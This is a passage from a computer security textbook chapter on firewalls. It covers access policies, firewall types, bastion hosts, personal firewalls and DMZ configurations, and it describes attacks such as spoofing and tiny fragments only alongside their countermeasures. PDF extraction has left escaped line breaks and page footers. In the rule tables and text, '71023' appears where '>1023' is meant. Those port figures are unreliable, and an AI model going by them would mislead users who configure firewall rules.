thousands of systems, running various \\r\\noperating systems, such as different versions of Windows, MacOS, and Linux. When \\r\\na security flaw is discovered, each potentially affected system must be upgraded to \\r\\nfix that flaw. This requires scaleable configuration management and aggressive patch\\ufffeing to function effectively. While difficult, this is possible and is necessary if only \\r\\nhost-based security is used. A widely accepted alternative or at least complement \\r\\nto host-based security services is the firewall. The firewall is inserted between the \\r\\npremises network and the Internet to establish a controlled link and to erect an outer \\r\\nsecurity wall or perimeter. The aim of this perimeter is to protect the premises net\\ufffework from Internet-based attacks and to provide a single choke point where security \\r\\nand auditing can be imposed. The firewall may be a single computer system or a set \\r\\nof two or more systems that cooperate to perform the firewall function.\\r\\nThe firewall, then, provides an additional layer of defense, insulating the inter\\ufffenal systems from external networks. This follows the classic military doctrine of \\r\\n“defense in depth,” which is just as applicable to IT security.\\r\\n9.2 FIREWALL CHARACTERISTICS AND ACCESS POLICY\\r\\n[BELL94] lists the following design goals for a firewall:\\r\\n1. All traffic from inside to outside, and vice versa, must pass through the fire\\ufffewall. This is achieved by physically blocking all access to the local network \\r\\nexcept via the firewall. Various configurations are possible, as explained later \\r\\nin this chapter.\\r\\n2. Only authorized traffic, as defined by the local security policy, will be allowed to \\r\\npass. Various types of firewalls are used, which implement various types of security \\r\\npolicies, as explained later in this chapter.\\r\\n3. The firewall itself is immune to penetration. This implies the use of a hardened \\r\\nsystem with a secured operating system, as we will describe in Chapter 12.\\r\\nA critical component in the planning and implementation of a firewall is speci\\ufffefying a suitable access policy. This lists the types of traffic authorized to pass through \\r\\nthe firewall, including address ranges, protocols, applications, and content types. This \\r\\npolicy should be developed from the organization’s information security risk assess\\ufffement and policy, that we will discuss in Chapters 14 and 15. This policy should be \\r\\ndeveloped from a broad specification of which traffic types the organization needs \\r\\nto support. It is then refined to detail the filter elements we will discuss next, which \\r\\ncan then be implemented within an appropriate firewall topology.\\r\\nNIST SP 800-41 (Guidelines on Firewalls and Firewall Policy, September 2009) \\r\\nlists a range of characteristics that a firewall access policy could use to filter traffic, \\r\\nincluding:\\r\\n• IP Address and Protocol Values: Controls access based on the source or \\r\\ndestination addresses and port numbers, direction of flow being inbound or \\r\\noutbound, and other network and transport layer characteristics. This type of \\r\\nfiltering is used by packet filter and stateful inspection firewalls. It is typically \\r\\nused to limit access to specific services.\\r\\nM09_STAL0611_04_GE_C09.indd 312 10/11/17 2:59 PM\\n\\n\\n9.2 / FIREWALL CHARACTERISTICS AND ACCESS POLICY 313\\r\\n• Application Protocol: Controls access on the basis of authorized application \\r\\nprotocol data. This type of filtering is used by an application-level gateway \\r\\nthat relays and monitors the exchange of information for specific application \\r\\nprotocols, for example, checking Simple Mail Transfer Protocol (SMTP) e-mail \\r\\nfor spam, or HTTP Web requests to authorized sites only.\\r\\n• User Identity: Controls access based on the users identity, typically for inside \\r\\nusers who identify themselves using some form of secure authentication \\r\\ntechnology, such as IPSec (see Chapter 22).\\r\\n• Network Activity: Controls access based on considerations such as the time or \\r\\nrequest, for example, only in business hours; rate of requests, for example, to \\r\\ndetect scanning attempts; or other activity patterns.\\r\\nBefore proceeding to the details of firewall types and configurations, it is best to \\r\\nsummarize what one can expect from a firewall. The following capabilities are within \\r\\nthe scope of a firewall:\\r\\n1. A firewall defines a single choke point that attempts to keep unauthorized \\r\\nusers out of the protected network, prohibit potentially vulnerable services from \\r\\nentering or leaving the network, and provide protection from various kinds \\r\\nof IP spoofing and routing attacks. The use of a single choke point simplifies \\r\\nsecurity management because security capabilities are consolidated on a single \\r\\nsystem or set of systems.\\r\\n2. A firewall provides a location for monitoring security-related events. Audits and \\r\\nalarms can be implemented on the firewall system.\\r\\n3. A firewall is a convenient platform for several Internet functions that are not \\r\\nsecurity related. These include a network address translator, which maps local \\r\\naddresses to Internet addresses, and a network management function that audits \\r\\nor logs Internet usage.\\r\\n4. A firewall can serve as the platform for IPSec. Using the tunnel mode capability \\r\\ndescribed in Chapter 22, the firewall can be used to implement virtual private \\r\\nnetworks.\\r\\nFirewalls have their limitations, including the following:\\r\\n1. The firewall cannot protect against attacks that bypass the firewall. Internal \\r\\nsystems may have wired or mobile broadband capability to connect to an ISP. \\r\\nAn internal LAN may have direct connections to peer organizations that bypass \\r\\nthe firewall.\\r\\n2. The firewall may not protect fully against internal threats, such as a disgrun\\ufffetled employee or an employee who unwittingly cooperates with an external \\r\\nattacker.\\r\\n3. An improperly secured wireless LAN may be accessed from outside the organiza\\ufffetion. An internal firewall that separates portions of an enterprise network cannot \\r\\nguard against wireless communications between local systems on different sides \\r\\nof the internal firewall.\\r\\n4. A laptop, PDA, or portable storage device may be used and infected outside \\r\\nthe corporate network, then attached and used internally.\\r\\nM09_STAL0611_04_GE_C09.indd 313 10/11/17 2:59 PM\\n\\n\\n314 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\n9.3 TYPES OF FIREWALLS\\r\\nA firewall can monitor network traffic at a number of levels, from low-level network \\r\\npackets, either individually or as part of a flow, to all traffic within a transport con\\ufffenection, up to inspecting details of application protocols. The choice of which level \\r\\nis appropriate is determined by the desired firewall access policy. It can operate as a \\r\\npositive filter, allowing to pass only packets that meet specific criteria, or as a negative \\r\\nFigure 9.1 Types of Firewalls\\r\\nFirewall\\r\\n(a) General model\\r\\nInternal (protected) network\\r\\n(e.g., enterprise network)\\r\\nExternal (untrusted) network\\r\\n(e.g., Internet)\\r\\nApplication\\r\\nTransport\\r\\nEnd-to-end\\r\\ntransport\\r\\nconnection\\r\\nEnd-to-end\\r\\ntransport\\r\\nconnection\\r\\n(b) Packet filtering firewall\\r\\n(d) Application proxy firewall\\r\\nExternal\\r\\ntransport\\r\\nconnection\\r\\nInternal\\r\\ntransport\\r\\nconnection\\r\\nApplication proxy\\r\\nInternet\\r\\nNetwork\\r\\naccess\\r\\nPhysical\\r\\nApplication\\r\\nTransport\\r\\nInternet\\r\\nNetwork\\r\\naccess\\r\\nPhysical\\r\\nApplication\\r\\nTransport\\r\\nInternet\\r\\nNetwork\\r\\naccess\\r\\nPhysical\\r\\nApplication\\r\\nTransport\\r\\nEnd-to-end\\r\\ntransport\\r\\nconnection\\r\\nEnd-to-end\\r\\ntransport\\r\\nconnection\\r\\nState\\r\\ninfo\\r\\n(c) Stateful inspection firewall\\r\\nInternet\\r\\nNetwork\\r\\naccess\\r\\nPhysical\\r\\n(e) Circuit-level proxy firewall\\r\\nExternal\\r\\ntransport\\r\\nconnection\\r\\nInternal\\r\\ntransport\\r\\nconnection\\r\\nCircuit-level proxy\\r\\nApplication\\r\\nTransport\\r\\nInternet\\r\\nNetwork\\r\\naccess\\r\\nPhysical\\r\\nApplication\\r\\nTransport\\r\\nInternet\\r\\nNetwork\\r\\naccess\\r\\nPhysical\\r\\nM09_STAL0611_04_GE_C09.indd 314 10/11/17 2:59 PM\\n\\n\\n9.3 / TYPES OF FIREWALLS 315\\r\\nfilter, rejecting any packet that meets certain criteria. The criteria implement the \\r\\naccess policy for the firewall that we discussed in the previous section. Depending \\r\\non the type of firewall, it may examine one or more protocol headers in each packet, \\r\\nthe payload of each packet, or the pattern generated by a sequence of packets. In this \\r\\nsection, we look at the principal types of firewalls.\\r\\nPacket Filtering Firewall\\r\\nA packet filtering firewall applies a set of rules to each incoming and outgoing \\r\\nIP packet and then forward or discards the packet (see Figure 9.1b). The firewall is \\r\\ntypically configured to filter packets going in both directions (from and to the internal \\r\\nnetwork). Filtering rules are based on information contained in a network packet:\\r\\n• Source IP address: The IP address of the system that originated the IP packet \\r\\n(e.g., 192.178.1.1).\\r\\n• Destination IP address: The IP address of the system the IP packet is trying to \\r\\nreach (e.g., 192.168.1.2).\\r\\n• Source and destination transport-level address: The transport-level (e.g., TCP \\r\\nor UDP) port number, which defines applications such as SNMP or HTTP.\\r\\n• IP protocol field: Defines the transport protocol.\\r\\n• Interface: For a firewall with three or more ports, which interface of the fire\\ufffewall the packet came from or for which interface of the firewall the packet is \\r\\ndestined.\\r\\nThe packet filter is typically set up as a list of rules based on matches to fields \\r\\nin the IP or TCP header. If there is a match to one of the rules, that rule is invoked to \\r\\ndetermine whether to forward or discard the packet. If there is no match to any rule, \\r\\nthen a default action is taken. Two default policies are possible:\\r\\n• Default = discard: That which is not expressly permitted is prohibited.\\r\\n• Default = forward: That which is not expressly prohibited is permitted.\\r\\nThe default discard policy is more conservative. Initially, everything is \\r\\nblocked, and services must be added on a case-by-case basis. This policy is more \\r\\nvisible to users, who are more likely to see the firewall as a hindrance. However, \\r\\nthis is the policy likely to be preferred by businesses and government organizations. \\r\\nFurther, visibility to users diminishes as rules are created. The default forward \\r\\npolicy increases ease of use for end users but provides reduced security; the secu\\uffferity administrator must, in essence, react to each new security threat as it becomes \\r\\nknown. This policy may be used by generally more open organizations, such as \\r\\nuniversities.\\r\\nTable 9.1 is a simplified example of a rule set for SMTP traffic. The goal is to \\r\\nallow inbound and outbound e-mail traffic but to block all other traffic. The rules are \\r\\napplied top to bottom to each packet. The intent of each rule is:\\r\\n1. Inbound mail from an external source is allowed (port 25 is for SMTP incoming).\\r\\n2. This rule is intended to allow a response to an inbound SMTP connection.\\r\\n3. Outbound mail to an external source is allowed.\\r\\nM09_STAL0611_04_GE_C09.indd 315 10/11/17 2:59 PM\\n\\n\\n316 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\n4. This rule is intended to allow a response to an outbound SMTP connection.\\r\\n5. This is an explicit statement of the default policy. All rule sets include this rule \\r\\nimplicitly as the last rule.\\r\\nThere are several problems with this rule set. Rule 4 allows external traffic to \\r\\nany destination port above 1023. As an example of an exploit of this rule, an exter\\ufffenal attacker can open a connection from the attacker’s port 5150 to an internal Web \\r\\nproxy server on port 8080. This is supposed to be forbidden and could allow an attack \\r\\non the server. To counter this attack, the firewall rule set can be configured with a \\r\\nsource port field for each row. For rules 2 and 4, the source port is set to 25; for rules \\r\\n1 and 3, the source port is set to 71023.\\r\\nBut a vulnerability remains. Rules 3 and 4 are intended to specify that any inside \\r\\nhost can send mail to the outside. A TCP packet with a destination port of 25 is routed \\r\\nto the SMTP server on the destination machine. The problem with this rule is that \\r\\nthe use of port 25 for SMTP receipt is only a default; an outside machine could be \\r\\nconfigured to have some other application linked to port 25. As the revised rule 4 is \\r\\nwritten, an attacker could gain access to internal machines by sending packets with a \\r\\nTCP source port number of 25. To counter this threat, we can add an ACK flag field \\r\\nto each row. For rule 4, the field would indicate that the ACK flag must be set on the \\r\\nincoming packet. Rule 4 would now look like this:\\r\\nRule Direction\\r\\nSrc \\r\\naddress Src port\\r\\nDest \\r\\naddress Protocol Dest port Flag Action\\r\\n4 In External 25 Internal TCP 71023 ACK Permit\\r\\nThe rule takes advantage of a feature of TCP connections. Once a connection \\r\\nis set up, the ACK flag of a TCP segment is set to acknowledge segments sent from \\r\\nthe other side. Thus, this rule allows incoming packets with a source port number of \\r\\n25 that include the ACK flag in the TCP segment.\\r\\nOne advantage of a packet filtering firewall is its simplicity. In addition, packet \\r\\nfilters typically are transparent to users and are very fast. NIST SP 800-41 lists the \\r\\nfollowing weaknesses of packet filter firewalls:\\r\\n• Because packet filter firewalls do not examine upper-layer data, they cannot \\r\\nprevent attacks that employ application-specific vulnerabilities or functions. For \\r\\nexample, a packet filter firewall cannot block specific application commands; if \\r\\nRule Direction Src address Dest addresss Protocol Dest port Action\\r\\n1 In External Internal TCP 25 Permit\\r\\n2 Out Internal External TCP 71023 Permit\\r\\n3 Out Internal External TCP 25 Permit\\r\\n4 In External Internal TCP 71023 Permit\\r\\n5 Either Any Any Any Any Deny\\r\\nTable 9.1 Packet-Filtering Examples\\r\\nM09_STAL0611_04_GE_C09.indd 316 10/11/17 2:59 PM\\n\\n\\n9.3 / TYPES OF FIREWALLS 317\\r\\na packet filter firewall allows a given application, all functions available within \\r\\nthat application will be permitted.\\r\\n• Because of the limited information available to the firewall, the logging func\\ufffetionality present in packet filter firewalls is limited. Packet filter logs normally \\r\\ncontain the same information used to make access control decisions (source \\r\\naddress, destination address, and traffic type).\\r\\n• Most packet filter firewalls do not support advanced user authentication \\r\\nschemes. Once again, this limitation is mostly due to the lack of upper-layer \\r\\nfunctionality by the firewall.\\r\\n• Packet filter firewalls are generally vulnerable to attacks and exploits that take \\r\\nadvantage of problems within the TCP/IP specification and protocol stack, such \\r\\nas network layer address spoofing. Many packet filter firewalls cannot detect \\r\\na network packet in which the OSI Layer 3 addressing information has been \\r\\naltered. Spoofing attacks are generally employed by intruders to bypass the \\r\\nsecurity controls implemented in a firewall platform.\\r\\n• Finally, due to the small number of variables used in access control decisions, \\r\\npacket filter firewalls are susceptible to security breaches caused by improper \\r\\nconfigurations. In other words, it is easy to accidentally configure a packet filter \\r\\nfirewall to allow traffic types, sources, and destinations that should be denied \\r\\nbased on an organization’s information security policy.\\r\\nSome of the attacks that can be made on packet filtering firewalls and the \\r\\nappropriate countermeasures are the following:\\r\\n• IP address spoofing: The intruder transmits packets from the outside with a \\r\\nsource IP address field containing an address of an internal host. The attacker \\r\\nhopes that the use of a spoofed address will allow penetration of systems that \\r\\nemploy simple source address security, in which packets from specific trusted \\r\\ninternal hosts are accepted. The countermeasure is to discard packets with an \\r\\ninside source address if the packet arrives on an external interface. In fact, this \\r\\ncountermeasure is often implemented at the router external to the firewall.\\r\\n• Source routing attacks: The source station specifies the route that a packet \\r\\nshould take as it crosses the Internet, in the hopes that this will bypass security \\r\\nmeasures that do not analyze the source routing information. A countermea\\ufffesure is to discard all packets that use this option.\\r\\n• Tiny fragment attacks: The intruder uses the IP fragmentation option to create \\r\\nextremely small fragments and force the TCP header information into a sepa\\uffferate packet fragment. This attack is designed to circumvent filtering rules that \\r\\ndepend on TCP header information. Typically, a packet filter will make a filter\\ufffeing decision on the first fragment of a packet. All subsequent fragments of that \\r\\npacket are filtered out solely on the basis that they are part of the packet whose \\r\\nfirst fragment was rejected. The attacker hopes the filtering firewall examines \\r\\nonly the first fragment and the remaining fragments are passed through. A tiny \\r\\nfragment attack can be defeated by enforcing a rule that the first fragment of \\r\\na packet must contain a predefined minimum amount of the transport header. \\r\\nIf the first fragment is rejected, the filter can remember the packet and discard \\r\\nall subsequent fragments.\\r\\nM09_STAL0611_04_GE_C09.indd 317 10/11/17 2:59 PM\\n\\n\\n318 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\nStateful Inspection Firewalls\\r\\nA traditional packet filter makes filtering decisions on an individual packet basis \\r\\nand does not take into consideration any higher-layer context. To understand what is \\r\\nmeant by context and why a traditional packet filter is limited with regard to context, \\r\\na little background is needed. Most standardized applications that run on top of TCP \\r\\nfollow a client/server model. For example, for the SMTP, e-mail is transmitted from \\r\\na client system to a server system. The client system generates new e-mail messages, \\r\\ntypically from user input. The server system accepts incoming e-mail messages and \\r\\nplaces them in the appropriate user mailboxes. SMTP operates by setting up a TCP \\r\\nconnection between client and server, in which the TCP server port number, which \\r\\nidentifies the SMTP server application, is 25. The TCP port number for the SMTP \\r\\nclient is a number between 1024 and 65535 that is generated by the SMTP client.\\r\\nIn general, when an application that uses TCP creates a session with a remote \\r\\nhost, it creates a TCP connection in which the TCP port number for the remote \\r\\n(server) application is a number less than 1024 and the TCP port number for the \\r\\nlocal (client) application is a number between 1024 and 65535. The numbers less than \\r\\n1024 are the “well-known” port numbers and are assigned permanently to particular \\r\\napplications (e.g., 25 for server SMTP). The numbers between 1024 and 65535 are \\r\\ngenerated dynamically and have temporary significance only for the lifetime of a \\r\\nTCP connection.\\r\\nA simple packet filtering firewall must permit inbound network traffic on all \\r\\nthese high-numbered ports for TCP-based traffic to occur. This creates a vulnerability \\r\\nthat can be exploited by unauthorized users.\\r\\nA stateful packet inspection firewall tightens up the rules for TCP traffic by \\r\\ncreating a directory of outbound TCP connections, as shown in Table 9.2. There is \\r\\nan entry for each currently established connection. The packet filter will now allow \\r\\nincoming traffic to high-numbered ports only for those packets that fit the profile of \\r\\none of the entries in this directory.\\r\\nSource Address Source Port\\r\\nDestination \\r\\nAddress Destination Port\\r\\nConnection \\r\\nState\\r\\n192.168.1.100 1030 210.9.88.29 80 Established\\r\\n192.168.1.102 1031 216.32.42.123 80 Established\\r\\n192.168.1.101 1033 173.66.32.122 25 Established\\r\\n192.168.1.106 1035 177.231.32.12 79 Established\\r\\n223.43.21.231 1990 192.168.1.6 80 Established\\r\\n219.22.123.32 2112 192.168.1.6 80 Established\\r\\n210.99.212.18 3321 192.168.1.6 80 Established\\r\\n24.102.32.23 1025 192.168.1.6 80 Established\\r\\n223.21.22.12 1046 192.168.1.6 80 Established\\r\\nTable 9.2 Example Stateful Firewall Connection State Table\\r\\nM09_STAL0611_04_GE_C09.indd 318 10/11/17 2:59 PM\\n\\n\\n9.3 / TYPES OF FIREWALLS 319\\r\\nA stateful packet inspection firewall reviews the same packet information as \\r\\na packet filtering firewall, but also records information about TCP connections (see \\r\\nFigure 9.1c). Some stateful firewalls also keep track of TCP sequence numbers to \\r\\nprevent attacks that depend on the sequence number, such as session hijacking. \\r\\nSome even inspect limited amounts of application data for some well-known pro\\ufffetocols such as FTP, IM, and SIPS commands, in order to identify and track related \\r\\nconnections.\\r\\nApplication-Level Gateway\\r\\nAn application-level gateway, also called an application proxy, acts as a relay of \\r\\napplication-level traffic (see Figure 9.1d). The user contacts the gateway using a \\r\\nTCP/IP application, such as Telnet or FTP, and the gateway asks the user for the \\r\\nname of the remote host to be accessed. When the user responds and provides a \\r\\nvalid user ID and authentication information, the gateway contacts the applica\\ufffetion on the remote host and relays TCP segments containing the application data \\r\\nbetween the two endpoints. If the gateway does not implement the proxy code for a \\r\\nspecific application, the service is not supported and cannot be forwarded across the \\r\\nfirewall. Further, the gateway can be configured to support only specific features of \\r\\nan application that the network administrator considers acceptable while denying \\r\\nall other features.\\r\\nApplication-level gateways tend to be more secure than packet filters. Rather \\r\\nthan trying to deal with the numerous possible combinations that are to be allowed \\r\\nand forbidden at the TCP and IP level, the application-level gateway need only scru\\ufffetinize a few allowable applications. In addition, it is easy to log and audit all incoming \\r\\ntraffic at the application level.\\r\\nA prime disadvantage of this type of gateway is the additional processing over\\ufffehead on each connection. In effect, there are two spliced connections between the \\r\\nend users, with the gateway at the splice point, and the gateway must examine and \\r\\nforward all traffic in both directions.\\r\\nCircuit-Level Gateway\\r\\nA fourth type of firewall is the circuit-level gateway or circuit-level proxy (see \\r\\nFigure 9.1e). This can be a stand-alone system or it can be a specialized function \\r\\nperformed by an application-level gateway for certain applications. As with an appli\\ufffecation gateway, a circuit-level gateway does not permit an end-to-end TCP connec\\ufffetion; rather, the gateway sets up two TCP connections, one between itself and a TCP \\r\\nuser on an inner host and one between itself and a TCP user on an outside host. Once \\r\\nthe two connections are established, the gateway typically relays TCP segments from \\r\\none connection to the other without examining the contents. The security function \\r\\nconsists of determining which connections will be allowed.\\r\\nA typical use of circuit-level gateways is a situation in which the system admin\\ufffeistrator trusts the internal users. The gateway can be configured to support applica\\ufffetion-level or proxy service on inbound connections and circuit-level functions for \\r\\noutbound connections. In this configuration, the gateway can incur the processing \\r\\noverhead of examining incoming application data for forbidden functions, but does \\r\\nnot incur that overhead on outgoing data.\\r\\nM09_STAL0611_04_GE_C09.indd 319 10/11/17 2:59 PM\\n\\n\\n320 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\nAn example of a circuit-level gateway implementation is the SOCKS package \\r\\n[KOBL92]; version 5 of SOCKS is specified in RFC 1928. The RFC defines SOCKS \\r\\nin the following fashion:\\r\\nThe protocol described here is designed to provide a framework for client–server \\r\\napplications in both the TCP and UDP domains to conveniently and securely use \\r\\nthe services of a network firewall. The protocol is conceptually a “shim-layer” \\r\\nbetween the application layer and the transport layer, and as such does not \\r\\nprovide network-layer gateway services, such as forwarding of ICMP messages.\\r\\nSOCKS consists of the following components:\\r\\n• The SOCKS server, which often runs on a UNIX-based firewall. SOCKS is also \\r\\nimplemented on Windows systems.\\r\\n• The SOCKS client library, which runs on internal hosts protected by the firewall.\\r\\n• SOCKS-ified versions of several standard client programs such as FTP and \\r\\nTELNET. The implementation of the SOCKS protocol typically involves either \\r\\nthe recompilation or relinking of TCP-based client applications, or the use of \\r\\nalternate dynamically loaded libraries, to use the appropriate encapsulation \\r\\nroutines in the SOCKS library.\\r\\nWhen a TCP-based client wishes to establish a connection to an object that is \\r\\nreachable only via a firewall (such determination is left up to the implementation), it \\r\\nmust open a TCP connection to the appropriate SOCKS port on the SOCKS server \\r\\nsystem. The SOCKS service is located on TCP port 1080. If the connection request \\r\\nsucceeds, the client enters a negotiation for the authentication method to be used, \\r\\nauthenticates with the chosen method, then sends a relay request. The SOCKS server \\r\\nevaluates the request and either establishes the appropriate connection or denies \\r\\nit. UDP exchanges are handled in a similar fashion. In essence, a TCP connection is \\r\\nopened to authenticate a user to send and receive UDP segments, and the UDP seg\\ufffements are forwarded as long as the TCP connection is open.\\r\\n9.4 FIREWALL BASING\\r\\nIt is common to base a firewall on a stand-alone machine running a common operat\\ufffeing system, such as UNIX or Linux, that may be supplied as a pre-configured security \\r\\nappliance. Firewall functionality can also be implemented as a software module in a \\r\\nrouter or LAN switch, or in a server. In this section, we look at some additional fire\\ufffewall basing considerations.\\r\\nBastion Host\\r\\nA bastion host is a system identified by the firewall administrator as a critical strong \\r\\npoint in the network’s security. Typically, the bastion host serves as a platform for \\r\\napplication-level or circuit-level gateways, or to support other services such as IPSec. \\r\\nCommon characteristics of a bastion host are as follows:\\r\\n• The bastion host hardware platform executes a secure version of its operating \\r\\nsystem, making it a hardened system.\\r\\nM09_STAL0611_04_GE_C09.indd 320 10/11/17 2:59 PM\\n\\n\\n9.4 / FIREWALL BASING 321\\r\\n• Only the services that the network administrator considers essential are \\r\\ninstalled on the bastion host. These could include proxy applications for DNS, \\r\\nFTP, HTTP, and SMTP.\\r\\n• The bastion host may require additional authentication before a user is allowed \\r\\naccess to the proxy services. In addition, each proxy service may require its own \\r\\nauthentication before granting user access.\\r\\n• Each proxy is configured to support only a subset of the standard application’s \\r\\ncommand set.\\r\\n• Each proxy is configured to allow access only to specific host systems. This \\r\\nmeans that the limited command/feature set may be applied only to a subset of \\r\\nsystems on the protected network.\\r\\n• Each proxy maintains detailed audit information by logging all traffic, each \\r\\nconnection, and the duration of each connection. The audit log is an essential \\r\\ntool for discovering and terminating intruder attacks.\\r\\n• Each proxy module is a very small software package specifically designed for \\r\\nnetwork security. Because of its relative simplicity, it is easier to check such \\r\\nmodules for security flaws. For example, a typical UNIX mail application \\r\\nmay contain over 20,000 lines of code, while a mail proxy may contain fewer \\r\\nthan 1,000.\\r\\n• Each proxy is independent of other proxies on the bastion host. If there is a \\r\\nproblem with the operation of any proxy, or if a future vulnerability is dis\\ufffecovered, it can be uninstalled without affecting the operation of the other \\r\\nproxy applications. In addition, if the user population requires support for a \\r\\nnew service, the network administrator can easily install the required proxy \\r\\non the bastion host.\\r\\n• A proxy generally performs no disk access other than to read its initial configu\\uffferation file. Hence, the portions of the file system containing executable code \\r\\ncan be made read-only. This makes it difficult for an intruder to install Trojan \\r\\nhorse sniffers or other dangerous files on the bastion host.\\r\\n• Each proxy runs as a nonprivileged user in a private and secured directory on \\r\\nthe bastion host.\\r\\nHost-Based Firewalls\\r\\nA host-based firewall is a software module used to secure an individual host. Such \\r\\nmodules are available in many operating systems or can be provided as an add-on \\r\\npackage. Like conventional stand-alone firewalls, host-resident firewalls filter and \\r\\nrestrict the flow of packets. A common location for such firewalls is on a server. \\r\\nThere are several advantages to the use of a server-based or workstation-based \\r\\nfirewall:\\r\\n• Filtering rules can be tailored to the host environment. Specific corporate secu\\uffferity policies for servers can be implemented, with different filters for servers \\r\\nused for different application.\\r\\n• Protection is provided independent of topology. Thus, both internal and exter\\ufffenal attacks must pass through the firewall.\\r\\nM09_STAL0611_04_GE_C09.indd 321 10/11/17 2:59 PM\\n\\n\\n322 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\n• Used in conjunction with stand-alone firewalls, the host-based firewall provides \\r\\nan additional layer of protection. A new type of server can be added to the \\r\\nnetwork, with its own firewall, without the necessity of altering the network \\r\\nfirewall configuration.\\r\\nNetwork Device Firewall\\r\\nFirewall functions, especially packet filtering and stateful inspection capabilities, are \\r\\ncommonly provided in network devices such as routers and switches to monitor and \\r\\nfilter packet flows through the device. They are used to provide additional layers of \\r\\nprotection in conjunction with bastion hosts and host-based firewalls.\\r\\nVirtual Firewall\\r\\nIn a virtualized environment, rather than using physically separate devices as server, \\r\\nswitches, routers, or firewall bastion hosts, there may be virtualized versions of these, \\r\\nsharing common physical hardware. Firewall capabilities may also be provided in the \\r\\nhypervisor that manages the virtual machines in this environment. We will discuss \\r\\nthese alternatives further in Section 12.8.\\r\\nPersonal Firewall\\r\\nA personal firewall controls the traffic between a personal computer or workstation \\r\\non one side and the Internet or enterprise network on the other side. Personal fire\\ufffewall functionality can be used in the home environment and on corporate intranets. \\r\\nTypically, the personal firewall is a software module on the personal computer. In \\r\\na home environment with multiple computers connected to the Internet, firewall \\r\\nfunctionality can also be housed in a router that connects all of the home computers \\r\\nto a DSL, cable modem, or other Internet interface.\\r\\nPersonal firewalls are typically much less complex than either server-based \\r\\nfirewalls or stand-alone firewalls. The primary role of the personal firewall is to deny \\r\\nunauthorized remote access to the computer. The firewall can also monitor outgoing \\r\\nactivity in an attempt to detect and block worms and other malware.\\r\\nPersonal firewall capabilities are provided by the netfilter package on Linux sys\\ufffetems, the pf package on BSD and MacOS systems, or by the Windows Firewall. These \\r\\npackages may be configured on the command-line, or with a GUI front-end. When \\r\\nsuch a personal firewall is enabled, all inbound connections are usually denied except \\r\\nfor those the user explicitly permits. Outbound connections are usually allowed. The \\r\\nlist of inbound services that can be selectively re-enabled, with their port numbers, \\r\\nmay include the following common services:\\r\\n• Personal file sharing (548, 427)\\r\\n• Windows sharing (139)\\r\\n• Personal Web sharing (80, 427)\\r\\n• Remote login—SSH (22)\\r\\n• FTP access (20-21, 1024-65535 from 20-21)\\r\\n• Printer sharing (631, 515)\\r\\n• IChat Rendezvous (5297, 5298)\\r\\nM09_STAL0611_04_GE_C09.indd 322 10/11/17 2:59 PM\\n\\n\\n9.5 / FIREWALL LOCATION AND CONFIGURATIONS 323\\r\\n• iTunes Music Sharing (3869)\\r\\n• CVS (2401)\\r\\n• Gnutella/Limewire (6346)\\r\\n• ICQ (4000)\\r\\n• IRC (194)\\r\\n• MSN Messenger (6891-6900)\\r\\n• Network Time (123)\\r\\n• Retrospect (497)\\r\\n• SMB (without netbios–445)\\r\\n• VNC (5900-5902)\\r\\n• WebSTAR Admin (1080, 1443)\\r\\nWhen FTP access is enabled, ports 20 and 21 on the local machine are opened \\r\\nfor FTP; if others connect to this computer from ports 20 or 21, the ports 1024 through \\r\\n65535 are open.\\r\\nFor increased protection, advanced firewall features may be configured. For \\r\\nexample, stealth mode hides the system on the Internet by dropping unsolicited \\r\\ncommunication packets, making it appear as though the system is not present. UDP \\r\\npackets can be blocked, restricting network traffic to TCP packets only for open \\r\\nports. The firewall also supports logging, an important tool for checking on unwanted \\r\\nactivity. Other types of personal firewall allow the user to specify that only selected \\r\\napplications, or applications signed by a valid certificate authority, may provide ser\\ufffevices accessed from the network.\\r\\n9.5 FIREWALL LOCATION AND CONFIGURATIONS\\r\\nAs Figure 9.1a indicates, a firewall is positioned to provide a protective barrier \\r\\nbetween an external (potentially untrusted) source of traffic and an internal net\\ufffework. With that general principle in mind, a security administrator must decide on \\r\\nthe location and on the number of firewalls needed. In this section, we look at some \\r\\ncommon options.\\r\\nDMZ Networks\\r\\nFigure 9.2 illustrates a common firewall configuration that includes an additional \\r\\nnetwork segment between an internal and an external firewall (see also Figure 8.5). \\r\\nAn external firewall is placed at the edge of a local or enterprise network, just inside \\r\\nthe boundary router that connects to the Internet or some wide area network (WAN). \\r\\nOne or more internal firewalls protect the bulk of the enterprise network. Between \\r\\nthese two types of firewalls are one or more networked devices in a region referred \\r\\nto as a DMZ (demilitarized zone) network. Systems that are externally accessible but \\r\\nneed some protections are usually located on DMZ networks. Typically, the systems \\r\\nin the DMZ require or foster external connectivity, such as a corporate website, an \\r\\ne-mail server, or a DNS (domain name system) server.\\r\\nM09_STAL0611_04_GE_C09.indd 323 10/11/17 2:59 PM\\n\\n\\n324 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\nThe external firewall provides a measure of access control and protection for \\r\\nthe DMZ systems consistent with their need for external connectivity. The external \\r\\nfirewall also provides a basic level of protection for the remainder of the enterprise \\r\\nnetwork. In this type of configuration, internal firewalls serve three purposes:\\r\\n1. The internal firewall adds more stringent filtering capability, compared to the \\r\\nexternal firewall, in order to protect enterprise servers and workstations from \\r\\nexternal attack.\\r\\nFigure 9.2 Example Firewall Configuration\\r\\nInternet\\r\\nWeb\\r\\nservers(s)\\r\\nE-mail\\r\\nserver\\r\\nInternal protected network\\r\\nApplication and database servers\\r\\nWorkstations\\r\\nLAN\\r\\nswitch\\r\\nInternal\\r\\nf irewall\\r\\nLAN\\r\\nswitch\\r\\nExternal\\r\\nf irewall\\r\\nBoundary\\r\\nrouter\\r\\nDNS\\r\\nserver\\r\\nInternal DMZ network\\r\\nM09_STAL0611_04_GE_C09.indd 324 10/11/17 2:59 PM\\n\\n\\n9.5 / FIREWALL LOCATION AND CONFIGURATIONS 325\\r\\n2. The internal firewall provides two-way protection with respect to the DMZ. First, \\r\\nthe internal firewall protects the remainder of the network from attacks launched \\r\\nfrom DMZ systems. Such attacks might originate from worms, rootkits, bots, or \\r\\nother malware lodged in a DMZ system. Second, an internal firewall can protect \\r\\nthe DMZ systems from attack from the internal protected network.\\r\\n3. Multiple internal firewalls can be used to protect portions of the internal net\\ufffework from each other. Figure 8.5 